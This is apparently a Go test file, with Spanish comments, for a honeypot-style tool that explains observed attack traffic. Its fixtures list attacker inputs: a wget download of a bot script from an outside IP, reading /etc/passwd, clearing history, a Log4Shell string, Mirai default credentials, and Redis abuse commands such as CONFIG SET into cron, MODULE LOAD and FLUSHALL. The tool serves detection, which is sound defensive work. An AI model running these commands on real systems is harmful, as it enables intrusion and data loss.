package saber

import (
	"strings"
	"testing"
)

func TestExplicaLoQueSeVeDeVerdad(t *testing.T) {
	casos := []struct {
		observado string
		contiene  string
	}{
		{"/SDK/webLanguage", "Hikvision"},
		{"GET /.env", "entorno"},
		{"/wp-login.php", "WordPress"},
		{"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "PHPUnit"},
		{"${jndi:ldap://x/a}", "Log4Shell"},
		{"/boaform/admin/formLogin", "router"},
		{"/favicon.ico", "navegador"},
	}
	for _, c := range casos {
		t.Run(c.observado, func(t *testing.T) {
			n, hay := DeRuta(c.observado)
			if !hay {
				t.Fatalf("no hay nota para %q", c.observado)
			}
			if !strings.Contains(n.Que+" "+n.Por, c.contiene) {
				t.Errorf("la nota %q no menciona %q", n.Que, c.contiene)
			}
		})
	}
}

func TestExplicaLosComandos(t *testing.T) {
	casos := map[string]string{
		"wget http://1.2.3.4/bot.sh -O /tmp/x": "descarga",
		"chmod +x /tmp/x":                      "ejecucion",
		"cat /etc/passwd":                      "usuarios",
		"uname -a":                             "sistema",
		"history -c":                           "historial",
		"crontab -l":                           "programada",
	}
	for cmd, quiero := range casos {
		n, hay := DeComando(cmd)
		if !hay {
			t.Errorf("sin nota para %q", cmd)
			continue
		}
		if !strings.Contains(strings.ToLower(n.Que+" "+n.Por), quiero) {
			t.Errorf("%q -> %q, se esperaba algo con %q", cmd, n.Que, quiero)
		}
	}
}

// Los diccionarios de las botnets de IoT son publicos: reconocerlos
// identifica a la familia casi con certeza.
func TestReconoceLosDiccionariosDeIoT(t *testing.T) {
	if n, hay := DeCredencial("root", "xc3511"); !hay || !strings.Contains(n.Por, "Mirai") {
		t.Errorf("root:xc3511 deberia senalar a Mirai, dio %+v", n)
	}
	if n, hay := DeCredencial("ROOT", "XC3511"); !hay {
		t.Errorf("la busqueda debe ignorar mayusculas, dio %+v", n)
	}
	if _, hay := DeCredencial("juan", "unaContrasenaCualquiera"); hay {
		t.Error("una credencial cualquiera no deberia tener nota")
	}
}

func TestDistingueHerramientaDePersona(t *testing.T) {
	n, _ := DeCliente("SSH-2.0-Go")
	if !strings.Contains(n.Por, "escaner") && !strings.Contains(n.Que, "Go") {
		t.Errorf("SSH-2.0-Go deberia delatar una herramienta: %+v", n)
	}
	n, _ = DeCliente("Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X)")
	if !strings.Contains(n.Por, "persona") {
		t.Errorf("un navegador deberia poder ser una persona: %+v", n)
	}
}

// Lo desconocido no se inventa: sin nota es mejor que una nota falsa.
func TestLoDesconocidoNoInventa(t *testing.T) {
	if n, hay := DeRuta("/una/ruta/que/nadie/ataca"); hay {
		t.Errorf("no deberia haber nota, dio %+v", n)
	}
	if n, hay := DeComando("ls -la"); hay {
		t.Errorf("no deberia haber nota, dio %+v", n)
	}
}

// Una aguja generica colocada antes de una especifica la deja muerta y
// nadie se entera: la nota sale, pero equivocada.
func TestLasAgujasEspecificasVanPrimero(t *testing.T) {
	for _, cat := range []struct {
		nombre string
		lista  []patron
	}{{"rutas", rutas}, {"comandos", comandos}, {"clientes", clientes}} {
		for i, p := range cat.lista {
			for j, otro := range cat.lista {
				if i >= j {
					continue
				}
				// Si una aguja anterior esta contenida en otra posterior,
				// la posterior nunca llega a evaluarse.
				if strings.Contains(otro.aguja, p.aguja) {
					t.Errorf("%s: %q (posicion %d) tapa a %q (posicion %d)",
						cat.nombre, p.aguja, i, otro.aguja, j)
				}
			}
		}
	}
}

func TestElCatalogoEstaCompleto(t *testing.T) {
	for _, cat := range [][]patron{rutas, comandos, clientes} {
		for _, p := range cat {
			if p.aguja == "" || p.nota.Que == "" {
				t.Errorf("entrada incompleta: %+v", p)
			}
			if p.aguja != strings.ToLower(p.aguja) {
				t.Errorf("la aguja %q debe ir en minusculas: la busqueda las normaliza", p.aguja)
			}
		}
	}
	for clave, n := range credenciales {
		if clave != strings.ToLower(clave) || n.Que == "" {
			t.Errorf("credencial mal registrada: %q -> %+v", clave, n)
		}
	}
}

func TestDistingueSondeoDeIntentoReal(t *testing.T) {
	casos := []struct {
		protocolo, comando string
		grave              bool
	}{
		{"redis", "PING", false},
		{"redis", "INFO", false},
		{"redis", "CONFIG GET maxmemory", false},
		{"redis", "NONEXISTENT", false},
		{"redis", "CONFIG SET dir /var/spool/cron", true},
		{"redis", "MODULE LOAD /tmp/x.so", true},
		{"redis", "SLAVEOF 1.2.3.4 6379", true},
		{"redis", "FLUSHALL", true},
		{"ftp", "SYST", false},
		{"ftp", "STOR puerta.php", true},
	}
	for _, c := range casos {
		v, hay := DeVerbo(c.protocolo, c.comando)
		if !hay {
			t.Errorf("sin nota para %s %q", c.protocolo, c.comando)
			continue
		}
		if v.Grave != c.grave {
			t.Errorf("%s %q: grave=%v, se esperaba %v", c.protocolo, c.comando, v.Grave, c.grave)
		}
	}
}

// "CONFIG SET" tambien empieza por "CONFIG": si el prefijo generico fuera
// primero, un intento real pasaria por simple reconocimiento.
func TestConfigSetNoSeConfundeConConfigGet(t *testing.T) {
	v, _ := DeVerbo("redis", "CONFIG SET dir /var/spool/cron")
	if !v.Grave {
		t.Error("CONFIG SET quedo tapado por una entrada mas generica")
	}
}

func TestSinShellSoloLosProtocolosConocidos(t *testing.T) {
	for _, p := range []string{"redis", "ftp", "http", "smtp", "REDIS"} {
		if !SinShell(p) {
			t.Errorf("%s deberia estar en la lista", p)
		}
	}
	for _, p := range []string{"ssh", "telnet", "protocolo-que-no-conocemos"} {
		if SinShell(p) {
			t.Errorf("%s no deberia estar: ante lo desconocido, mejor alertar", p)
		}
	}
}
